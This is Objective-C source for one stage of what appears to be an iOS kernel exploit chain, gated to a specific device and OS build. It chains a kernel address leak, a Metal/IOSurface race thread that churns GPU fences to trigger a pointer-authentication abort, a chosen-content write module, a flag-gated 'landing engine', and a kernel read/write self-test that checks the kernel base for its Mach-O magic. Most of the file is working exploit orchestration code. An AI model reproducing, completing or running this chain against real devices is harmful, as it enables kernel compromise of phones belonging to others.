//
//  P132ChainFrame.m — the staged chain frame (the full picture). p132.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Why the frame exists (2026-10-29): the three receipts interlock and
//  only read correctly together —
//    (1) abort #3 on 0x984fcc8, DELAYED 25 min after the p129 fence-x-fill
//        tap, far = PAC-fake (0x0020..48) with x17 = 0xcda1-tagged ptr —
//        the fence machinery walked a badly-signed pointer;
//    (2) GZ MAF data.kalloc.3072 on the SAME night's grid boot (the record
//        lane's standing attestation, 19 spilled staging-class records);
//    (3) NQ NULL-ctx kill #5 — the legit-path finding that reproduces on
//        its own.
//  The chain frame composes the primitives at the steps they unlock:
//  anchor (aio KVA family, +0xC0 law) -> fence churn live for the WHOLE
//  session (the delayed-abort condition) -> the p112 chosen-content write
//  receipt taken under that churn -> the landing engine only when
//  deliberately flagged -> the honest gate. Nothing here claims KRW; the
//  gate alone flips nothing. One tap per force-quit. PANIC-POSSIBLE.
//

#import "P132ChainFrame.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "P063AioKqueueLeak.h"
#import "P112CGShading.h"
#import "P073AneSecondTable.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P132_BUILD   @"p132-chainframe-v1"
#define P132_SURF_W  64
#define P132_SURF_H  64
#define P132_RECYCLE 8
#define P132_WATCH_S 45

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSString *P132R(void);

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static atomic_int g_stop;
static atomic_ulong ga_rounds, ga_commits, ga_recycles, ga_fails;
static CFMutableDictionaryRef g_dict;
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;

static void p132_law_dict(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = P132_SURF_W, h = P132_SURF_H, bpe = 4,
            bpr = P132_SURF_W * 4, as = P132_SURF_W * P132_SURF_H * 4;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef ne = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpr);
    CFNumberRef na = CFNumberCreate(NULL, kCFNumberSInt32Type, &as);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ne);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), nr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(ne); CFRelease(nr); CFRelease(na);
    g_dict = d;
}

/* the fence churn thread (the p127/p130 body — engine-driven teardown,
   drain walker, append range cluster in the hot path) */
static void *p132_fencer(void *u) {
    (void)u;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P132_SURF_W height:P132_SURF_H
         mipmapped:NO];
    td.storageMode = MTLStorageModeShared;
    unsigned long r = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            if (r % P132_RECYCLE == 0) {
                for (int k = 0; k < 2; k++) {
                    if (tex[k]) tex[k] = NULL;
                    if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
                }
                for (int k = 0; k < 2; k++) {
                    void *s = g_surfCreate(g_dict);
                    if (!s) { atomic_fetch_add(&ga_fails, 1); continue; }
                    tex[k] = [dev newTextureWithDescriptor:td
                                                 iosurface:(IOSurfaceRef)s
                                                     plane:0];
                    surfaces[k] = s;
                    if (!tex[k]) atomic_fetch_add(&ga_fails, 1);
                }
                atomic_fetch_add(&ga_recycles, 1);
            }
            if (!tex[0] || !tex[1]) { r++;
              [NSThread sleepForTimeInterval:0.01]; continue; }
            id<MTLCommandBuffer> cb = [q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
               sourceOrigin:MTLOriginMake(0,0,0)
               sourceSize:MTLSizeMake(P132_SURF_W, P132_SURF_H, 1)
               toTexture:tex[1] destinationSlice:0 destinationLevel:0
               destinationOrigin:MTLOriginMake(0,0,0)];
            [e endEncoding];
            [cb commit];
            [cb waitUntilCompleted];
            atomic_fetch_add(&ga_commits, 1);
            r++;
            atomic_store(&ga_rounds, r);
        }
    }
    for (int k = 0; k < 2; k++) {
        if (tex[k]) tex[k] = NULL;
        if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
    }
    return NULL;
}

static void p132_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p132", arms, 1, &sr, 0, "p132 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p132", 0, outcome);
}

@implementation P132ChainFrame

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p132_chainframe_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p132 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P132_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[chain law] the receipts interlock; the frame runs them at the");
    L(@"  steps they unlock (anchor -> fence-live -> write-receipt ->");
    L(@"  flagged landing -> gate). The 20:20 abort met exactly the");
    L(@"  condition this frame reproduces ON DEMAND with witnesses");
    L(@"  instead of hours later. Nothing claims KRW; the gate decides.");
    L(@"[!] PANIC-POSSIBLE - one tap per force-quit.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p132"];
    if (stop) { L(stop); p132_bandit("gated"); return P132R(); }

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosf) { L(@"[-] STOP dlopen"); p132_bandit("nodlopen"); return P132R(); }
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!g_surfCreate || !g_surfID) { L(@"[-] STOP dlsym"); p132_bandit("nodlsym"); return P132R(); }
    p132_law_dict();

    /* ---------- STAGE ANCHOR: the aio KVA family (slide-tracker law) ---- */
    L(@"=== STAGE ANCHOR: [p063 aio leak] (the KVA family the chain reuses) ===");
    NSString *aio = [P063AioKqueueLeak tap];
    if (aio.length) {
        L(aio.length > 6000 ? [@"[p063 head/truncated]\n" stringByAppendingString:
            [aio substringToIndex:6000]] : aio);
    } else {
        L(@"  [p063 returned empty - honest note]");
    }
    L(@"  [reuse] the leaked KVA(s) stand as the session's anchor family;");
    L(@"  the per-boot variability = the slide law, the +0xC0 intra-boot");
    L(@"  stride = the object-position law. Both feed stage WRITE/GATE");

    /* ---------- STAGE FENCE: churn STARTS and stays live --------------- */
    L(@"=== STAGE FENCE: fence churn STARTS (lives for the whole session) ===");
    L(@"[IN FLIGHT] the 20:20-condition, now with witnesses - one tap per force-quit.");
    unsigned long c0 = atomic_load(&ga_commits), r0 = atomic_load(&ga_rounds);
    atomic_store(&g_stop, 0);
    pthread_t ta;
    pthread_create(&ta, NULL, p132_fencer, NULL);

    /* ---------- STAGE WRITE: the chosen-content receipt UNDER churn ----- */
    L(@"=== STAGE WRITE: [p112 v1.2] seeded chosen=1.0 (one render, under churn) ===");
    NSString *chosenPath = [docs stringByAppendingPathComponent:@"p112_chosen.txt"];
    [@"" writeToFile:chosenPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [[NSString stringWithFormat:@"1.0\n"] writeToFile:chosenPath
        atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSString *p112log = [P112CGShading tap];
    if (p112log.length) {
        L(p112log.length > 7000 ? [@"[p112 head/truncated]\n" stringByAppendingString:
            [p112log substringToIndex:7000]] : p112log);
    } else {
        L(@"  [p112 returned empty - honest note]");
    }

    /* ---------- STAGE LAND: the landing engine, FLAG-GATED -------------- */
    NSString *landPath = [docs stringByAppendingPathComponent:@"p132_land.txt"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:landPath]) {
        L(@"=== STAGE LAND: [p073] flagged - the record landing engine fires ===");
        NSString *p073log = [P073AneSecondTable tap];
        if (p073log.length) {
            L(p073log.length > 6000 ? [@"[p073 head/truncated]\n" stringByAppendingString:
                [p073log substringToIndex:6000]] : p073log);
        } else {
            L(@"  [p073 returned empty - honest note]");
        }
    } else {
        L(@"=== STAGE LAND: skipped (Documents/p132_land.txt absent) —");
        L(@"  flag it on boots where you want the record-lane landing fire,");
        L(@"  one per force-quit.");
    }

    /* ---------- the late window: delayed landings / delayed aborts ------ */
    L(@"=== LATE WATCHER (45s) — the p129 law says the abort class fires");
    L(@"    OUT-OF-TAP; this window catches in-session delayed state ===");
    for (int t = 0; t < P132_WATCH_S; t += 15) {
        [NSThread sleepForTimeInterval:15];
        Lf(@"  [watch+%ds] fence: commits=%lu recycles=%lu fails=%lu", t,
           (unsigned long)atomic_load(&ga_commits),
           (unsigned long)atomic_load(&ga_recycles),
           (unsigned long)atomic_load(&ga_fails));
    }
    atomic_store(&g_stop, 1);
    pthread_join(ta, NULL);
    Lf(@"  churn summary: commits=%lu rounds=%lu recycles=%lu fails=%lu | "
       @"survived=YES in-tap",
       atomic_load(&ga_commits) - c0, atomic_load(&ga_rounds) - r0,
       (unsigned long)atomic_load(&ga_recycles),
       (unsigned long)atomic_load(&ga_fails));

    /* ---------- STAGE GATE: the only KRW claim path ---------------------- */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this session. Honest.");
        p132_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p132_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p132_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    L(@"  [read law] any post-session 0x984fcc8-band panic = the fence");
    L(@"  window LIVE under the frame; the .ips timing anchors it to this");
    L(@"  session (the 20:20 pattern, now reproducible on demand).");
    Lf(@"=== p132 end %@ ===", LabLocalMilitaryNow());
    return P132R();
}

static NSString *P132R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end